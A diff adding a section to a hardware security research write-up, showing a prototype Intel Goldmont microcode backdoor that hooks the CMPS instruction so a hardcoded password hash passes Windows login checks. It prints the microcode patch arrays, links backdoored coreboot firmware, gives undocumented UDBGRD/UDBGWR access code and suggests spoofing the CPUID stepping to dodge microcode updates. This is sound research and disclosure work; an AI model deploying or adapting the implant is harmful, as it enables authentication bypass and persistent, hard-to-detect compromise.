@@ -15,6 +15,13 @@
     3.1 Backdoored Instruction to Bypass OS Authentication
     3.2 Prototype on x86 QEMU TCG
     3.3 Prototype on Sparc64 (OpenSPARC T1) FPGA
+    3.4 Prototype on Intel Goldmont CPU with Microcode
+         3.4.1 Microcode Background
+         3.4.2 CMPS Microcode
+         3.4.3 CMPS Backdoor
+         3.4.4 Patch through Coreboot 
+         3.4.5 The 0x0 Bytes Left Club
+         3.4.6 CRBUS, LDAT and Arrays
 4. Misc
     4.1 X86 SSE/AVX Instruction Sets
     4.2 Crazy Thoughts
@@ -1284,6 +1291,865 @@ The backdoor can also be utilized for SSH remote login, provided the SSH
 service is configured with password authentication.
 
 
+--[ 3.4 Prototype on Intel Goldmont CPU with Microcode
+
+To validate the backdoor concept for x86, I developed a prototype using
+QEMU’s TCG. However, as a software emulation, it inevitably has
+limitations. My long-term goal was to design my own x86 core, but that goal
+is still far and remains ongoing. At the time, I considered microcode as an
+alternative, but its inner mechanism were still too obscure. Now, in 2025,
+three years after completing the earlier phase of this research, new
+studies[112][101][105][109][114] have emerged, making microcode more accessible
+than ever.
+
+
+--[ 3.4.1 Microcode Background
+
+Microcode serves as an ideal middle ground between software emulation and
+physical silicon hardware. It could also be the perfect hiding place for
+real-world backdoors, embedded directly in the CPU, easy for vendors to
+update, and capable of supporting sophisticated malicious functionality[101].  
+
+The microcode format is not publicly documented and it is embedded in the
+CPU's internal memory, with updates only available in encrypted packages.
+However, AMD has a patent detailing their microcode implementation called
+RISC86[102], used in the AMD-K6 processor. In my opinion, this is the most
+detailed public document on the subject from a major CPU vendor. I am also
+still learning, so I am not in a position to explain how microcode works.
+But for context, I will provide a brief overview of microcode as I
+understand it.
+
+While x86 is classified as a CISC (Complex Instruction Set Computer)
+architecture, in contrast to RISC (Reduced Instruction Set Computer),
+modern x86 CPUs have internally used RISC-like micro-operations (uops)
+since the Intel Pentium Pro and AMD K6 processors. These CPUs employ
+multiple advanced instruction decoders to break down complex x86 CISC
+instructions into simpler RISC-style microcode for execution.
+
+Quote from an old AMD document[104]: "The AMD-K6 processor uses a combination
+of decoders to convert x86 instructions into RISC86 operations. The
+hardware includes four decoders: 
+
+Two parallel short decoders - These translate the most commonly used x86
+instructions into zero, one, or two RISC86 operations each. They are also
+designed to decode up to two x86 instructions per clock. 
+
+Long decoder - This handles commonly used x86 instructions that can be
+represented in four or fewer RISC86 operations.
+
+Vectoring decoder - This handles all other translations in concert with
+RISC86 operation sequences fetched from an on-chip ROM."
+
+Contemporary processors now process complex instructions through Micro
+Sequencer (MS). This unit retrieves micro-operations from the Microcode
+Sequencer ROM (MSROM) and coordinates their dispatch to execution units.
+Intel's Optimization Reference Manual (Section 22.5.7.2, 'Understanding the
+Sources of the Micro-op Queue') confirms that string instructions are
+processed in this manner.
+
+This means we could actually tweak how the cmps instruction works. However,
+accessing and altering x86 microcode has historically been a substantial
+technical challenge due to Intel's proprietary security mechanisms.
+Pioneering work by Ermolov, Sklyarov, and Goryachy has achieved critical
+breakthroughs in this domain through their research on Intel's Goldmont
+microarchitecture. Their research uncovered a critical vulnerability in TXE
+firmware that permits arbitrary code execution and achieves privileged "red
+unlock" status[105][106], effectively bypassing conventional microcode security
+protections.
+
+Furthermore, their discovery of previously undocumented UDBGRD/UDBGWR
+instructions[112][108] provides direct access to the internal CRBUS (Control
+Register Bus), enabling unprecedented low-level processor control.
+Complementing these findings, the uCodeDisasm project[107] has made
+substantial progress in decoding microcode semantics and identifying
+numerous undocumented microarchitectural features and control registers.
+All these efforts together have opened new avenues for deeper analysis of
+processor internals.
+
+
+--[ 3.4.2 CMPS Microcode
+
+Identifying the microcode entry point for the CMPS instruction is
+relatively straightforward due to its characteristic usage of architectural
+registers. The instruction employs RCX as its loop counter while utilizing
+RSI and RDI as string pointers. So, simply look for microcode associated
+with RCX, RDI, and RSI and fits the three rules[107] for microcode entries.
+
+1. The address for any x86 entry point is in the range U0000-U1000
+2. The address for x86 instruction entry must be a multiple of 8 
+3. There must not be references in other places of ucode to the x86 entry
+   address
+
+The CMPS microcode entry is located at U08b0. Fortunately/Unfortunately, no
+backdoor functionality exists, much to my disappointment, since I was
+hoping for a major scandal. The microcode itself is quite basic, as shown
+below.
+
+U08b0: 108100034021            tmp4:= OR_DSZN(rcx)
+U08b1: 01505e100234            UJMPCC_DIRECT_NOTTAKEN_CONDZ(tmp4, U045e)
+U08b2: 021e3b000200            SIGEVENT(0x0000003b)
+
+U08b4: 014310a00200            AETTRACE(0x08, IMM_MACRO_ALIAS_INSTRUCTION)
+U08b5: 213e0003a000            tmp10:= MOVEMERGEFLGS_DSZ32(0x00000000)
+           01bcc872            SEQW GOTO U3cc8
+
+
+U3cc8: 1c0000231027            tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)
+U3cc9: 1c0000630026            tmp0:= LDZX_DSZN_ASZ32_SC1(rsi, mode=0x18)
+U3cca: 108501034d08            tmp4:= SUB_DSZN(0x00000001, tmp4)
+
+U3ccc: 11890b8279c8 rdi:= ADDSUB_DSZ16_CONDD(IMM_MACRO_ALIAS_DATASIZE, rdi)
+U3ccd: 11890b826988 rsi:= ADDSUB_DSZ16_CONDD(IMM_MACRO_ALIAS_DATASIZE, rsi)
+U3cce: 10050003ac31 MSLOOP-> tmp10:= SUB_DSZN(tmp1, tmp0)
+
+U3cd0: 015f6410023a            UJMPCC_DIRECT_TAKEN_CONDZ(tmp10, U0464)
+U3cd1: 015064100234            UJMPCC_DIRECT_NOTTAKEN_CONDZ(tmp4, U0464)
+           053cc840            SEQW GOTO U3cc8
+
+
+U045c: 1088000269a6            rsi:= ZEROEXT_DSZ16N(rsi, rsi)
+U045d: 1088000279e7            rdi:= ZEROEXT_DSZ16N(rdi, rdi)
+U045e: 108800021861            rcx:= ZEROEXT_DSZ16N(rcx, rcx)
+           018000f2            SEQW UEND0
+
+U0464: 237d3f000e88            GENARITHFLAGS(0x0000003f, tmp10)
+U0465: 108800021874            rcx:= ZEROEXT_DSZ16N(tmp4, rcx)
+U0466: 0fff00000000 SYNCWAIT-> SFENCE(0x00000000)
+           0b0000f2            SEQW UEND0
+
+
+The microcode binary was disassembled into assembly language using the
+uCodeDisasm. Before analyzing the code, it is necessary to first establish
+some fundamental concepts.
+
+The microcode comprises fixed-length RISC instructions. In Intel's Goldmont
+microarchitecture, these are 48-bit instructions grouped into sets of three
+called Microcode Triads. Each triad is accompanied by a Sequence Word
+(30-bit) that manages synchronization and memory fence attributes for the
+micro-instructions within the triad and controls program flow by selecting
+between sequential execution of the next triad, jumps to specified
+microcode addresses, or termination of the current routine. 
+
+Below are the micro-instruction and sequence word formats. As I am still
+studying their meanings, I will not provide a detailed explanation of each
+field here. For comprehensive information, please refer to the foundational
+documentation in uCodeDisasm[107] and lib-micro[109]. 
+
+
+ 4746 45 44 43         32 31    24 23 22 18 17   12 11    6 5     0
+ +---+--+--+-------------+--------+--+-----+-------+-------+-------+
+ |CRC|m2|m1|    opcode   |  imm0  |m0| imm1|  dst  | src1  | src0  |
+ +---+--+--+-------------+--------+--+-----+-------+-------+-------+
+   2  1  1       12          8     1    5      6      6       6
+
+
+ 2928 27 25 2423 22                8 7 6 5     2 1 0
+ +---+-----+---+--------------------+---+-------+---+
+ |CRC|sync |up2|          uaddr     |up1| eflow |up0|
+ +---+-----+---+--------------------+---+-------+---+
+   2    3    2            15          2     4     2
+
+
+The code appears relatively simple at first glance. It continuously loads
+data from memory locations pointed to by RSI and RDI, compares them, and
+increments the memory addresses in these registers while decrementing the
+counter value in RCX. 
+
+First, let's clarify the following abbreviations:
+
+ZX (Zero eXtended): Indicates zero-extension of a value. 
+DSZ (Data Size): Specifies the size of a data operand.
+ASZ (Address Size): Denotes the size of an address operand.
+SC (Scale): Represents the scaling factor in addressing calculations.
+
+And the terms TAKEN and NOTTAKEN serve as hints for the CPU's branch
+predictor.
+
+For example:
+
+ U3cc8: 1c0000231027 tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)
+
+This is a load instruction. While uCodeDisasm displays it with DSZN, the
+actual data size for this instruction is 32 bits. The opcode is 12 bits in
+length, with the data size encoded in bits [7:6] as follows:
+
+ 00: DSZ32
+ 01: DSZ64
+ 10: DSZ16
+ 11: DSZ8
+
+The instruction specifies both address and data sizes as 32-bit. This
+initially caused confusion since the test CPU (Intel Pentium N4200,
+Goldmont microarchitecture) is a 64-bit processor. I would expect the
+microcode to operate in 64-bit mode by default. I considered this might be
+a 32-bit version of the CMPS instruction. However, after thorough searching
+of the MSROM, I was unable to locate any corresponding 64-bit CMPS
+microcode routine.
+
+Testing the 64-bit "REPE CMPSQ" instruction on an x86-64 Ubuntu system
+confirmed that microcode routine U08b0 handles the 64-bit CMPS operation.
+During my analysis, I observed that while most micro-instructions in the
+MSROM use DSZ32/ASZ32, some explicitly specify ASZ64 and DSZ64. Also, the
+opcode for CMPSD is "A7", while CMPSQ uses "REX.W + A7" - the same opcode
+with a prefix modifier. This leads me to hypothesize that the 32-bit and
+64-bit CMPS operations might share the same microcode routine, with the
+REX.W prefix potentially generating a control signal that directs the
+execution unit to perform either 32-bit or 64-bit comparisons as
+appropriate.
+
+It is noticable that MOD1 (bit 44) is offten set on DSZ32 and ASZ32
+micro-instructions, whereas those specifying DSZ64 or ASZ64 usually do not
+have MOD1 set, though exceptions exist, such as in the case of "U3d4a:
+104900035924 tmp5:= MOVE_DSZ64(rsp, rsp)". 
+
+After some testing, the hypothesis seems to be correct. For example,
+"SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1" performs 64-bit comparisons
+during "REPE CMPSQ" operations but switches to 32-bit comparisons for "REPE
+CMPSD". In contrast, SUB_DSZ64_DRR(TMP10, TMP1, TMP0) maintains exclusively
+64-bit comparisons, even when the upper layer operating system operates in
+32-bit mode.  
+
+TMP0-TMP15 are 64-bit microarchitectural registers that can be used as
+scratch registers within microcode routines. Unlike architectural registers
+(such as RAX, RBX, etc.), which share a single RFLAGS register, each
+microarchitectural register has its own dedicated set of arithmetic flags.
+These flags are updated whenever the register is used as the destination of
+an arithmetic micro-instruction.
+
+For instance, consider the micro-operation at: "U3cce: 10050003ac31
+SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1". This instruction sets TMP10's Z
+flag if TMP1 equals TMP0. The subsequent micro-operation: "U3cd0:
+015f6410023a UJMPCC_DIRECT_TAKEN_CONDZ(tmp10, U0464)" then performs a
+conditional jump based on TMP10's Z flag state.
+
+This microcode routine is essentially what one would expect for a
+comparison instruction within a loop, except that instead of using CMP, the
+actual compare operation is performed by SUB, as is the case in the
+OpenSPARC CPU. Yet, despite the brevity of this code segment, several
+unresolved mysteries remain.
+
+For instance, what is the purpose of SIGEVENT(0x0000003b)? Why would the
+code send a signal immediately after checking the RCX register, before
+there is even a chance to trigger an access violation? Furthermore, if the
+subsequent LDZX_DSZN_ASZ32_SC1 operation accesses an illegal virtual
+address, should signals be generated then? Since the exact function of
+SIGEVENT remains unclear, the hook has been placed at U3cc8 instead of the
+cmps entry point U08b0 to avoid unintended side effects.
+
+
+--[ 3.4.3 CMPS Backdoor
+
+Now let's break down how this CMPS backdoor actually works. The mechanism
+is straightforward: when executed, it checks the memory location pointed to
+by RDI. If this value matches our predefined backdoor hash, the REPE CMPS
+instruction will set the Z flag in RFLAGS, falsely indicating string
+equivalence. Additionally, RCX must be cleared to zero, while RSI and RDI
+should be properly incremented or decremented based on the D flag. This
+adjustment is necessary because Windows' 64-bit RtlCompareMemory function
+determines string equality length using these register values. Again, we
+are using the hash '3dbde697d71690a769204beb12283678' (corresponding to
+password '123') for this experiment. To use less MSRAM space, the
+implementation compares only on the first 64 bits of the hash value, which
+is 0xa79016d797e6bd3d.
+
+The following microcode utilizes lib-micro[109] for writing to MSRAM and the
+Match/Patch registers. Its IN instruction microcode patch is essential for
+sustaining persistent microcode hooks. The forked version of lib-micro
+includes the CMPS backdoor implementation. Full source code is accessible
+at: https://github.com/whensungoesdown/lib-micro 
+
+This project compiles and executes on Linux systems with CPU red unlocked,
+intended for testing and research purposes. The CMPS microcode hook remains
+effective even in virtualized environments using Intel VMX technology, as
+virtual machines execute most instructions (including CMPS) directly on the
+physical host CPU. This makes it convenient to test the backdoor's effects
+on a Windows system running inside a KVM/QEMU virtual machine.
+
+
+ ucode_t ucode_patch[] = {
+     {   // 0x0
+         // 64-bit 0xa79016d797e6bd3d
+         // 32-bit 0x97e6bd3d
+         NOP,
+         LDZX_DSZ32_ASZ32_SC1_DR(TMP1, RDI, 0x08) | MOD1,  // seg 0x08 es
+         ZEROEXT_DSZ32_DI(TMP0, 0xa790),
+         NOP_SEQWORD
+     },
+     {   // 0x4
+         SHL_DSZ64_DRI(TMP0, TMP0, 0x10),
+         ADD_DSZ64_DRI(TMP0, TMP0, 0x16d7),
+         SHL_DSZ64_DRI(TMP0, TMP0, 0x10),
+         NOP_SEQWORD
+     },
+     {   // 0x8 
+         ADD_DSZ64_DRI(TMP0, TMP0, 0x97e6),
+         SHL_DSZ64_DRI(TMP0, TMP0, 0x10),
+         ADD_DSZ64_DRI(TMP0, TMP0, 0xbd3d),
+         NOP_SEQWORD
+     },
+     {   // 0xc
+         NOP,
+         //SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1,   // dst, src0, src1
+         SUB_DSZ64_DRR(TMP10, TMP1, TMP0),   // dst, src0, src1
+         UJMPCC_DIRECT_NOTTAKEN_CONDZ_RI(TMP10, JUMP_DESTINATION),
+         NOP_SEQWORD
+         //0x018000e5, //SUB MSLOOP 
+         // BUG FIX: no MSLOOP, msloop cause gdb traped at repe cmps with 
+         //          resume flag (RF) set
+     },
+     {   // 0x10
+         //U3cc8: 1c0000231027   tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)
+         //U3cc9: 1c0000630026   tmp0:= LDZX_DSZN_ASZ32_SC1(rsi, mode=0x18)
+         //U3cca: 108501034d08   tmp4:= SUB_DSZN(0x00000001, tmp4)
+         0x1c0000231027, 0x1c0000630026, 0x108501034d08, 0x18000c0
+     },
+     {   // 0x1c
+         UJMP_I(hook_address+4), 
+         UJMP_I(hook_address+5), 
+         UJMP_I(hook_address+6),
+         NOP_SEQWORD
+     }
+ };
+
+ // JUMP_DESTINATION code
+ ucode_t ucode_patch[] = {
+     //U3ccc: 11890b8279c8 rdi:= ADDSUB_DSZ16_CONDD(
+     //                                   IMM_MACRO_ALIAS_DATASIZE, rdi)
+     //U3ccd: 11890b826988 rsi:= ADDSUB_DSZ16_CONDD(
+     //                                   IMM_MACRO_ALIAS_DATASIZE, rsi)
+     {
+         0x11890b8279c8, 0x11890b8279c8, 0x11890b826988, NOP_SEQWORD
+     },
+     {
+         0x11890b826988, NOP, NOP, NOP_SEQWORD
+     }, 
+     {
+         SUB_DSZ32_DRR(RCX, RCX, RCX) | MOD1,
+         GENARITHFLAGS_IR(0x0000003f, TMP10), 
+         SFENCE,
+         END_SEQWORD
+     } // SEQW UEND0
+ };
+
+
+Initially, I used LDZX_DSZ64_ASZ64_SC8_DR(TMP1, RDI, 0x08) to read the
+first 64-bit value. The testing environment was a 32-bit Windows 10
+KVM/QEMU virtual machine. While the backdoored cmps instruction functioned
+correctly during the Windows login process, issues arose during the early
+boot stage after a system reboot. To resolve this, I switched to using
+LDZX_DSZ32_ASZ32_SC1_DR(TMP1, RDI, 0x08) | MOD1, as previously described. A
+likely reason for this behavior is that DSZ64/ASZ64 instructions are
+incompatible with the real-mode execution environment present during early
+boot stages.
+
+The implementation is hardcoded to hook at U3cc8, where the original triad
+is copied to be executed before branching to the next triad. This microcode
+is specific to the Intel N4200 (family 06, model 92) stepping 10, as CPUs
+of the same model with different steppings may have MSROM variations due to
+accumulated microcode patches.
+
+
+--[ 3.4.4 Patch through Coreboot 
+
+As introduced earlier, the attack scenario assumes that the CPU vendor
+implants a backdoor in the silicon during production. In the context of
+microcode, the vendor could either embed malicious microcode in the MSROM
+at the factory or distribute a harmful microcode patch to update all CPUs
+of the same model. This patch would load every time the system boots,
+placing the malicious code in the MSRAM. To validate this concept and
+closely emulate the vendor’s actions, the most feasible approach is to
+embed the backdoor code in the BIOS and patch the microcode during each
+system boot.
+
+When Mark Ermolov, Dmitry Sklyarov, and Maxim Goryachy achieved the "Red
+Unlock" on an Intel Goldmont microarchitecture CPU, they used a Gigabyte
+NUC (model GB-BPCE-3350C) as their test machine. Later, KaKaRoTo continued
+this work on a Beelink-M1 NUC[110]. Subsequently, Alexander Krog and
+Alexander Skovsende released the lib-micro project, rewriting the exploit
+for their own machine, which I believe was an UP Squared Pro N4200.
+
+If you want to replicate this, you will likely need an Intel Silicon View
+Technology Closed Chassis Adapter (SVTCCA) to debug the Management Engine
+(ME) code. Otherwise, the best option is to find the exact same hardware
+and use the existing exploit.
+
+For my setup, I got Red Unlock working using their pre-built firmware.
+Alough lib-micro’s coreboot image did not boot on my UP Squared (Pro)
+board, but their exploit worked. As a workaround, I recompiled Coreboot
+with extracted modules. 
+
+My Coreboot fork, including the CPU backdoor, is available at:
+https://github.com/whensungoesdown/coreboot
+
+It also provides a Coreboot pre-built image that enables Red Unlock, loads
+the CPU backdoor microcode, and fixes the VGA driver. I tested it on an UP
+Squared Pro N4200 (the 4GB RAM/32GB storage version). The coreboot and red
+unlock part should work fine on both UPSquared and UPSquared Pro boards,
+since there is not much difference between them. That said, if you've got a
+UPSquared board, you're probably looking at an N4200 stepping 9 CPU.
+Welcome to the 0x0 Bytes Left Club, see section 3.4.5.
+
+The microcode part is unchanged from the previous test project. The
+firmware implementation now requires loading this microcode on all CPU
+cores. One optimal place appears to be cpu_initialize() in arch/x86/cpu.c,
+as this is where coreboot applies the official microcode updates. The
+backdoor microcode patch should then be applied afterward.
+
+For simplicity, the CPU backdoor only compromises the CMPS instruction as
+previously described. But there is one issue. When attempting to install a
+newer version of Windows 10 (22H2, far more recent than the Intel N4200’s
+release), the installer crashes with a MICROCODE_REVISION_MISMATCH
+bluescreen. Nice one, Microsoft.
+
+In contrast, Ubuntu 24.04 silently installs the microcode patch and removes
+the backdoor hooks without any warning. 
+
+For CPU vendors, this should not be a concern as they control all microcode
+updates. For others, there is a solution: hooking the CPUID instruction and
+altering the stepping number, tricking the OS into believing the CPU is
+much newer, thus avoiding microcode updates.
+
+For example, testing with an older Windows 10 version (2016 release) works
+flawlessly: no installation errors, and the backdoor remains intact.
+However, altering the stepping number leaves a detectable trace. But
+seriously, who pays attention to that?
+
+
+--[ 3.4.5 The 0x0 Bytes Left Club
+
+During implementation and testing, two Intel N4200 processors were used,
+stepping 9 and 10. Clearly, the stepping 9 is an earlier iteration. It uses
+all available microcode RAM and takes 28 out of the 32 match/patch
+registers, as detailed below.
+
+ idx p src    dst
+ 00: 0 0x0000  0x0000
+ 01: 1 0x1434  0x06c6
+ 02: 1 0x4c04  0x7c0a
+ 03: 1 0x61e6  0x7cae
+ 04: 1 0x757a  0x7cb0
+ 05: 1 0x244a  0x7cdc
+ 06: 1 0x065c  0x7c5c
+ 07: 1 0x29ca  0x7c2e
+ 08: 1 0x2078  0x7cf6
+ 09: 1 0x263a  0x7cfe
+ 10: 1 0x18c4  0x7cfa
+ 11: 1 0x78d6  0x7d02
+ 12: 1 0x2018  0x7c04
+ 13: 1 0x5b94  0x7c14
+ 14: 1 0x5ce2  0x7c88
+ 15: 1 0x6908  0x7c6c
+ 16: 1 0x3b52  0x7c4a
+ 17: 1 0x4e76  0x7db8
+ 18: 1 0x01ce  0x7ce6
+ 19: 1 0x2ec8  0x7d6e
+ 20: 1 0x6ff6  0x7d26
+ 21: 1 0x13da  0x7d94
+ 22: 1 0x667c  0x7cea
+ 23: 1 0x0cd2  0x7d0a
+ 24: 1 0x0e66  0x7d7a
+ 25: 1 0x4c5a  0x7dd6
+ 26: 1 0x24bc  0x7d12
+ 27: 1 0x31a4  0x7d36
+ 28: 1 0x758e  0x7df6
+ 29: 0 0x0000  0x0000
+ 30: 0 0x0000  0x0000
+ 31: 0 0x0000  0x0000
+
+
+Match/patch table is implemented as one of Microcode Seuqencer
+Arrays (array 3), with the following structure:
+
+  30                    16 15                       0
+ +------------------------+------------------------+-+
+ |          dst           |           src          |p|
+ +------------------------+------------------------+-+
+            15                        15            1
+
+ p  : Indicates whether the entry is active
+ src: 15-bit source address (calculated as uaddr/2) representing the hook
+      location
+ dst: 15-bit destination address (calculated as uaddr/2) for the jump 
+      target
+
+
+This component plays a critical role in the microcode update system. During
+microcode execution, when the processor encounters an instruction at the
+src address, the control flow is redirected to the corresponding dst
+address, enabling runtime modification of the execution path. The table
+contains 32 entries, with the first entry typically reserved/unused.
+
+The MSRAM is completely filled up to 0x7df6 (as shown in slot 28), and the
+whole space stops at 0x7dff in case I didn't mention that before.  It
+leaves no space to insert more microcode. At first, I assumed microcode
+patches were incrementally applied with each update. To test this, I
+disabled microcode updates in the Linux kernel and even removed the
+microcode blob from coreboot. Surprisingly, the microcode RAM became even
+more saturated, and one more match/patch register was occupied.
+
+This means that if you are using stepping 9 (or an even earlier revision,
+if one exists) this experiment may not be feasible. To free up space, I
+attempted to erase certain match/patch registers, assuming that
+security-related patches would have minimal impact. However, the system
+became unstable. Shows these microcode patches are more serious than I
+thought.
+
+According to Coreboot doc, "When a CPU core comes out of reset, it uses
+microcode from an internal ROM. This “default” microcode often contains
+bugs, so it needs to be updated as soon as possible. For example, Core 2
+CPUs can boot without microcode updates, but have stability problems. On
+newer platforms, it is nearly impossible to boot without having updated the
+microcode. On some platforms, an updated microcode is required in order to
+enable Cache-As-RAM or to be able to successfully initialize the DRAM.
+Plus, microcode needs to be loaded multiple times. Intel Document 504790
+explains that this is because of so-called enhanced microcode updates,
+which are large updates with errata workarounds for both core and uncore.
+In order to correctly apply enhanced microcode updates, the MP-Init
+algorithm must be decomposed into multiple initialization phases.
+...
+Beginning with 4th generation Intel Core processors, it is possible for
+microcode to be updated before the CPU is taken out of reset. This is
+accomplished by means of FIT, a data structure which contains pointers to
+various firmware ingredients in the BIOS flash."
+
+Microcode updates are not optional especially those FIT ones in BIOS,
+because modern CPUs need them to even work right. To mess up a CPU with
+heavy microcode patches, maybe the only way is to analysis it, find gaps
+and squeeze code pieces in there like old-school infection virus.
+
+For this project, it would be much easier to start with a CPU that is
+stepping 10, there should be enough space to implant the backdoor
+microcode. Below is the current match/patch status for stepping 10 under
+microcode revision 0x28.
+
+idx p src   dst
+00: 0 0x0000  0x0000
+01: 1 0x4dc0  0x7c4c
+02: 1 0x2078  0x7c0e
+03: 1 0x682a  0x7c86
+04: 1 0x1c3c  0x7c30
+05: 1 0x6a10  0x7c44
+06: 1 0x3c7a  0x7c22
+07: 1 0x4f52  0x7cca
+08: 1 0x01d6  0x7c6a
+09: 1 0x2e44  0x7cbe
+10: 1 0x70fa  0x7c9e
+11: 1 0x13c2  0x7cea
+12: 1 0x67a0  0x7c6e
+13: 1 0x0cd2  0x7c82
+14: 1 0x209c  0x28d8
+15: 1 0x141e  0x7c96
+16: 1 0x24bc  0x7c8a
+17: 1 0x623a  0x7d16
+18: 0 0x0000  0x0000
+19: 0 0x0000  0x0000
+20: 0 0x0000  0x0000
+21: 0 0x0000  0x0000
+22: 0 0x0000  0x0000
+23: 0 0x0000  0x0000
+24: 0 0x0000  0x0000
+25: 0 0x0000  0x0000
+26: 0 0x0000  0x0000
+27: 0 0x0000  0x0000
+28: 0 0x0000  0x0000
+29: 0 0x0000  0x0000
+30: 0 0x0000  0x0000
+31: 0 0x0000  0x0000
+
+
+--[ 3.4.6 CRBUS, LDAT and Arrays
+
+An important aspect need to be covered is how data is read from MSROM and
+written to MSRAM. These operations rely on two critical components: CRBUS
+and LDAT. Since I'm still learning about these systems myself, I'll explain
+them to the best of my understanding.
+ 
+It makes sense for a processor to have an internal bus capable of
+monitoring the status of all its components. Such a bus would be essential
+for tasks like resetting hardware to predefined states, enabling or
+disabling specific features, and reading diagnostic data. While not
+documented in public specifications, these internal buses appear to exist
+across major architectures, such as Intel CRBUS (Configuration Register
+Bus) and IBM PIB (Pervasive Interconnect Bus).
+
+The CRBUS can be accessed through multiple interfaces[113]. One method is
+via the TAP (Test Access Port) which is a logic block responsible for
+executing tests and managing data flow along the boundary cells. In
+practice, this is commonly referred to as JTAG access.
+
+The following CRBUS read/write implementation is extracted from the TXE-POC
+project [105]:
+
+ def crbus_read(addr):
+     glm0 = ipc.devs.glm_module0
+     crbus_val = (0x3 << 79) | (addr << 65)
+     ipc.irdrscan(glm0, 0xa8, 83, None, crbus_val, False)
+     val = ipc.irdrscan(glm0, 0xa9, 83)
+     data = (val & ((1 <<  0x41) - 1)) >> 1
+     return data
+ 
+ def crbus_write(addr, val):
+     glm0 = ipc.devs.glm_module0
+     crbus_val = (0x1 << 80) | (addr << 65) | ((val &((1 << 64 ) -1)) << 1)
+     ipc.irdrscan(glm0, 0xa8, 83, None, crbus_val, False)
+
+
+The implementation utilizes ipccli lib's irdrscan function (from Intel
+System Studio) which performs combined IR/DR scan operations through the
+JTAG interface.
+
+ irdrscan(device, instruction, bitCount, data=None, writeData=None,
+          returnData=True)
+        
+   Perform a combined IR/DR scan to the specified device, passing in the
+   specified instruction for the IR scan and the specified bit count for 
+   the DR scan.
+
+   Parameters   
+     device (int) – the did or alias of the device (not needed if using 
+                    from a node object).
+
+     instruction (int) – The instruction to scan into the device.
+
+     bitCount (int) – The number of bits to scan from the data register of 
+                      the designated device as selected by the current 
+                      instruction register handle.
+
+     data (int) – can specify this or writeData with a number or BitData 
+                  object to write to the device (see note about backwards 
+                  compatibility).
+
+     writeData (int) – a number or BitData object to write to the device.
+
+     returnData (bool) – whether to return the data from the scan that was 
+                         done.
+
+   Returns
+     A BitData object containing the bits that were read back.
+
+
+The second parameter specifies the instruction to be scanned into the
+device. While the exact meaning of the "0xa8" used in the Python code above
+seems to be undocumented, it may correspond to "CRBUS" instruction as
+referenced in a Intel patent[113]."
+
+Accroding to the patent, the CRBUS consists of one 32-bit CR DATA BUS and
+10-bit CR ADDRESS & W/R BUS. Two different TAP instructions, "CRBUS" and
+"CRBUSNOGO", have been designed to perform the necessary accessing of
+control registers. The CRBUS command instructs the TAP to access the
+appropriate location and if it is a “write," to write the data to the
+accessed register. If the operation is a “read,” then the CRBUS command
+instructs data to be read from the accessed register. The CRBUSNOGO
+instruction is used (along with the CRBUS instruction) only for a read
+operation, to shift the data out as a serial TDO signal. 
+
+The referenced patent dates back to 2000, and modern implementations may
+differ significantly. For instance, the MSROM includes numerous control
+registers with addresses exceeding 10 bits. For current analysis, we can
+just treat CRBUS as an interconnect for accessing control registers
+distributed across the chip. 
+
+An alternative method for accessing CRBUS is via the undocumented
+instructions UDBGRD and UDBGWR, as disclosed by researchers Mark Ermolov,
+Dmitry Sklyarov, and Maxim Goryachy and implemented in lib-micro. The
+relevant code snippet is provided below.
+
+ __attribute__((always_inline))
+ u_result_t static inline udbgrd(uint64_t type, uint64_t addr) {
+     lmfence();
+     u_result_t res;
+     asm volatile(
+         ".byte 0x0F, 0x0E\n\t"
+         : "=d" (res.value)
+         , "=b" (res.status)
+         : "a" (addr)
+         , "c" (type)
+     );
+     lmfence();
+     return res;
+ } 
+
+ __attribute__((always_inline))
+ u_result_t static inline udbgwr(uint64_t type, uint64_t addr, 
+                                                uint64_t value) {
+     uint32_t value_low = (uint32_t)(value & 0xFFFFFFFF);
+     uint32_t value_high = (uint32_t)(value >> 32);
+     u_result_t res;
+     lmfence();
+     asm volatile(
+         ".byte 0x0F, 0x0F\n\t"
+         : "=d" (res.value)
+         , "=b" (res.status)
+         : "a" (addr)
+         , "c" (type)
+         , "d" (value_low)
+         , "b" (value_high)
+     );
+     lmfence();
+     return res;
+ }
+
+
+The opcodes for UDBGRD and UDBGWR are 0F0E and 0F0F, respectively.
+Referring back to the opcode map in Section 2, the last two cells of the
+first row are unassigned, indeed, these correspond to undocumented
+instructions.
+
+The RCX register specifies the target device to access. A value of 0x0
+corresponds to the CRBUS, while 0x10 indicates URAM, which is a private
+memory region exclusive to a single CPU core and not shared with others.
+For CRBUS read or write operations, the RAX register holds the address of
+the target control register.
+
+For MSROM reads or MSRAM writes, the relevant control registers belong to
+LDAT (Large Data Array Testing[111] or Local Direct Access Test[112]). As the
+name suggests, the LDAT engine manages large data arrays. 
+
+The engine has four registers: SDAT, PDAT, DATIN, and DATOUT[111][114]. By
+configuring SDAT/PDAT with address, array, bank, and other parameters,
+specific memory arrays can be read or written. It is unclear to me how this
+was reverse-engineered, whether through direct analysis or by referencing
+some XML files containing register address definitions. Previous
+research[112][114][109][115] provides these definitions, which I include here for
+easy reference.
+
+
+ SDAT Bitfield:
+    3                   2                   1                   0
+  1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 
+                 +-----------+---+-------+-------+-------+-------+
+                 |   Port    |Mod| DWord |ArrySel|       |BankSel|    
+                 +-----------+---+-------+-------+-------+-------+
+
+ PDAT Bitfield:
+    3                   2                   1                   0
+  1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 
+ +---------------+---+-----------+-------------------------------+
+ |               | A1|           |          FastAddr             |
+ +---------------+---+-----------+-------------------------------+
+
+A1 Command fields:
+  | Encoding | Name   |
+  +----------+--------+
+  |        0 | NOP    |
+  |        2 | WRITE  |
+  |        3 | READ   |
+
+Known arrays:
+  | PDAT CR | ArraySel | Name           | Description                   |
+  +---------+----------+----------------+-------------------------------|
+  |   0x6A0 |        0 | ms_rom         | Microcode ROM triads          |
+  |   0x6A0 |        1 | ms_rom_seqw    | Microcode ROM sequence words  |
+  |   0x6A0 |        2 | ms_ram_seqw    | Microcode RAM sequence words  |
